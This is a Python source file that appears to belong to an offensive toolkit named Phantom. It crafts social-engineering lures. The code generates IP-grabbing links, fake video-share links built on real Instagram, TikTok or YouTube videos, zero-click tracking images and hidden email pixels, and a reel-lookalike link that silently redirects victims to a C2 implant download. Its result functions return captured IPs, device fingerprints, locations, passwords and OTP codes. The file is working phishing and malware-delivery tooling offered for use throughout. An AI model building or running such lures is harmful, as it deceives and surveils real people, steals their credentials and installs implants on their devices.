"""craft.py — social-engineering lure crafting (manual core).

One workspace to build the delivery layer of a social engagement:

  craft ipgrab        plain IP-grabber link (click = IP + fingerprint)
  craft reel <term|url>  video-share lure on a REAL video YOU pick: a search
                      term (auto-picks an Instagram/TikTok/YouTube video the
                      target may want) or a full reel/short URL to mirror.
                      The share link strips the author's identifier and the
                      click lands on the IP grabber.
  craft image <file>  ZERO-CLICK image lure: hosts an image YOU choose; the
                      moment it RENDERS (email HTML / page / browser) the IP,
                      device fingerprint and location are captured — no click.
  craft pixel         ico tracker (1x1) — same zero-click capture, invisible
  craft beacon [os]   ONE-CLICK beacon delivery camouflaged as a video link
                      (reel-style URL that silently serves the C2 payload)
  craft hits <code>   every recorded hit / open / credential (+ device/geo)
  craft wait <code>   live-wait for the target

Everything prints in "ready to paste" form. The tracker is Phantom's own
local HTTP server (no third party), the same one the auto-mode uses.
"""

from __future__ import annotations

import os
import uuid
from typing import Any, Dict, List, Optional

from phantom.automation.social.grabbit import GrabLink, IpGrabber
from phantom.automation.social.tracker import (
    HitStore, VictimHit, OpenEvent, CredCapture,
    public_base_url, env_tracker,
)
from phantom.utils.notifier import notifier


_SINGLETON: Optional[IpGrabber] = None


def _grabber() -> IpGrabber:
    """Module-level singleton: env_tracker() builds a NEW TrackingServer on
    every call, so a fresh grabber per craft would read a different (empty)
    store than the one that received the victim's click. Sharing one
    grabber guarantees craft -> wait/hits see the same store."""
    global _SINGLETON
    if _SINGLETON is None:
        _SINGLETON = IpGrabber()
    return _SINGLETON


def _server() -> Any:
    g = _grabber()
    g._ensure_default_server()
    return g._default_server


def _tracking_base() -> str:
    try:
        server = _server()
        return public_base_url(server.host, server.port)
    except Exception:
        try:
            s = env_tracker()
            return public_base_url(s.host, s.port)
        except Exception:
            return "http://127.0.0.1:8080"


# ── lures ───────────────────────────────────────────────────────────────────

def craft_ipgrab(label: str = "phish", prefix: str = "") -> Dict[str, Any]:
    """Plain click-tracking link (click = IP + full fingerprint)."""
    link = _grabber().create_link(label=label, prefix=prefix)
    return _link_payload(link, kind="ipgrab")


def craft_reel(arg: str = "", platform: str = "instagram",
               label: str = "reel", handle: str = "") -> Dict[str, Any]:
    """Video-share lure on a REAL video YOU choose.

    `arg` is either a full share URL (instagram.com/reel/..., tiktok.com/@u/
    video/..., youtube.com/shorts/...) to mirror, or a search term that
    auto-picks a real public video the target may want to watch. The share
    link the victim receives strips the author's profile identifier and the
    click lands on the IP grabber (device fingerprint captured).
    """
    try:
        from phantom.automation.social.video_picker import pick_video, sanitize_query
    except Exception:
        pick_video = None
    video: Optional[Dict[str, str]] = None
    arg = (arg or "").strip()
    if not arg:
        return {"error": "Usage: craft reel <instagram|tiktok|youtube URL or search term>"}

    if arg.lower().startswith(("http://", "https://")):
        video = _mirror_url(arg)
        if video is None:
            return {"error": "Could not mirror that video (yt-dlp missing?). "
                             "Pass a search term instead, e.g. craft reel puppy"}
    elif pick_video is not None:
        video = pick_video(interests=[], platform=platform,
                           query=sanitize_query(arg), seed=uuid.uuid4().int % 2**32)
    if not video or not video.get("id"):
        return {"error": f"No real video found for '{arg}'"}

    platform = (video.get("source") or platform or "instagram").lower()
    if platform not in ("tiktok", "youtube"):
        platform = "instagram"
    link = _grabber().create_video_share_link(
        label=label, platform=platform, handle=handle or "", video=video)
    payload = _link_payload(link, kind="reel")
    payload["video"] = video
    payload["video_title"] = (video.get("title") or "")[:90]
    payload["platform"] = platform
    return payload


def _mirror_url(url: str) -> Optional[Dict[str, str]]:
    """Resolve a real share URL (IG/TikTok/YT) into {id, title, channel,
    source} via yt-dlp so the tracker renders THAT video."""
    import shutil
    import subprocess
    ytdlp = shutil.which("yt-dlp")
    if not ytdlp:
        return None
    try:
        out = subprocess.run(
            [ytdlp, "--no-warnings", "--skip-download", "--print",
             "%(id)s|%(title)s|%(channel)s|%(extractor)s", url],
            capture_output=True, text=True, timeout=45)
        if out.returncode != 0 or not out.stdout.strip():
            return None
        vid, title, channel, extractor = (out.stdout.strip().split("\n")[0]
                                          .split("|", 3))
        src = "youtube"
        low = extractor.lower()
        if "instagram" in low:
            src = "instagram"
        elif "tiktok" in low:
            src = "tiktok"
        return {"id": vid.strip(), "title": title.strip(),
                "channel": channel.strip(), "source": src}
    except Exception:
        return None


def craft_image(source: str, label: str = "img") -> Dict[str, Any]:
    """ZERO-CLICK image lure: hosts an image YOU choose on the tracker at
    /i/<code>. Whoever LOADS it (an <img> in an HTML email/page, or opening
    the URL in a browser) is captured — IP, OS, device, browser, location —
    with no interaction. `source` is a local path or an image URL."""
    import urllib.request
    if source.lower().startswith(("http://", "https://")):
        try:
            with urllib.request.urlopen(source, timeout=20) as r:
                data = r.read()
                ctype = r.headers.get("Content-Type", "image/jpeg")
        except Exception as e:
            return {"error": f"Could not fetch image: {e}"}
    else:
        path = os.path.expanduser(source)
        if not os.path.exists(path):
            return {"error": f"Image not found: {source}"}
        with open(path, "rb") as f:
            data = f.read()
        ctype = ("image/png" if path.lower().endswith(".png")
                 else "image/gif" if path.lower().endswith(".gif")
                 else "image/jpeg")
    if not data:
        return {"error": "Empty image"}

    link = _grabber().create_link(label=label, prefix="i/")
    try:
        _server().register_image(link.code, data, ctype)
    except Exception as e:
        return {"error": f"Tracker unavailable: {e}"}
    payload = _link_payload(link, kind="image")
    payload["html"] = (f'<img src="{link.short_url}" alt="" '
                       f'style="max-width:480px" />')
    payload["hint"] = ("Load = IP + device + location captured. Embed the "
                       "URL in an email <img> for zero-click capture.")
    return payload


def craft_video(label: str = "video", platform: str = "instagram",
                handle: str = "", video: Optional[Dict[str, str]] = None
                ) -> Dict[str, Any]:
    """Share-format video lure with a given real video (engine/API use)."""
    link = _grabber().create_video_share_link(
        label=label, platform=platform, handle=handle, video=video)
    return _link_payload(link, kind="video")


def craft_pixel(label: str = "px") -> Dict[str, Any]:
    """Tracking-pixel URL (1x1): IP captured when the image is RENDERED, no
    click required. Drop the URL in an <img src> of an HTML email or a page."""
    link = _grabber().create_link(label=label, prefix="px/")
    payload = _link_payload(link, kind="pixel")
    payload["html"] = (f'<img src="{link.short_url}" width="1" height="1" '
                       f'style="display:none" alt="" />')
    return payload


def _link_payload(link: GrabLink, kind: str) -> Dict[str, Any]:
    return {
        "kind": kind,
        "code": link.code,
        "url": link.short_url,
        "base": _tracking_base(),
        "created": True,
    }


def craft_beacon(platform: str = "android") -> Dict[str, Any]:
    """ONE-CLICK beacon delivery camouflaged as a video link: the tracker
    hands the victim an Instagram-reel-looking URL that silently redirects
    to the C2 payload endpoint for the platform (open the reel -> the
    implant downloads; opening the file is the install click). No QR — the
    link is indistinguishable from a shared reel at a glance."""
    from phantom.core.c2_server import server_instance
    from phantom.utils.network import get_c2_endpoint
    if not (server_instance.thread and server_instance.thread.is_alive()):
        return {"error": "C2 listener not running",
                "hint": "Start it with: c2 > listeners start"}
    endpoint = {
        "windows": "/api/v1/payload",
        "linux": "/api/v1/payload_linux",
        "macos": "/api/v1/payload_macos",
        "android": "/api/v1/payload_android",
    }.get(platform.lower(), "/api/v1/payload")
    host, port = get_c2_endpoint()
    payload_url = f"https://{host}:{port}{endpoint}"

    base = _tracking_base()
    code = f"beacon-{uuid.uuid4().hex[:8]}"
    reel_url = f"{base}/reel/{code}"
    try:
        _server().register_redirect(code, payload_url)
    except Exception as e:
        return {"error": f"Tracker unavailable: {e}"}
    return {
        "kind": "beacon",
        "code": code,
        "url": reel_url,
        "payload_url": payload_url,
        "platform": platform,
        "created": True,
        "hint": ("The link looks like a shared reel. When the target opens "
                 "it the compiled beacon downloads (one click to install)."),
    }


# ── waiting / results ───────────────────────────────────────────────────────

def _store() -> Optional[HitStore]:
    try:
        g = _grabber()
        g._ensure_default_server()
        return g._default_store
    except Exception:
        return None


def craft_hits(code: str) -> Dict[str, Any]:
    """Every recorded hit / open / credential for a lure code (instant read)."""
    store = _store()
    if store is None:
        return {"hits": [], "opens": [], "creds": []}
    return {
        "hits": [_hit_dict(h) for h in store.hits(code)],
        "opens": [_open_dict(o) for o in store.opens(code)],
        "creds": [_cred_dict(c) for c in store.creds(code)],
    }


def _hit_dict(h: VictimHit) -> Dict[str, Any]:
    return {"ip": h.ip, "ua": h.user_agent, "time": h.time,
            "os": h.os, "device": h.device, "browser": h.browser,
            "geo": h.geo, "referrer": h.referrer}


def _open_dict(o: OpenEvent) -> Dict[str, Any]:
    return {"ip": o.ip, "ua": o.user_agent, "time": o.time}


def _cred_dict(c: CredCapture) -> Dict[str, Any]:
    return {"ip": c.ip, "username": c.username, "password": c.password,
            "otp": c.otp, "time": c.time}


def craft_wait(code: str, timeout: float = 300.0, interval: float = 5.0) -> List[Dict[str, Any]]:
    """Blocking poll: returns every new hit until `timeout`. Ctrl+C stops it."""
    import time
    store = _store()
    seen: set = set()
    out: List[Dict[str, Any]] = []
    deadline = time.time() + timeout
    notifier.status(f"Waiting for the target... (Ctrl+C to stop, {int(timeout)}s)")
    while time.time() < deadline:
        try:
            hits = store.hits(code) if store is not None else []
        except Exception:
            hits = []
        fresh = [h for h in hits if h.ip not in seen]
        for h in fresh:
            seen.add(h.ip)
            out.append(_hit_dict(h))
            fp = "/".join(x for x in (h.os, h.device, h.browser) if x) or "device?"
            loc = f"  [{h.geo}]" if h.geo else ""
            notifier.success(f"⚡ HIT {h.ip}  {fp}{loc}  {h.user_agent[:36]}")
        time.sleep(interval)
    return out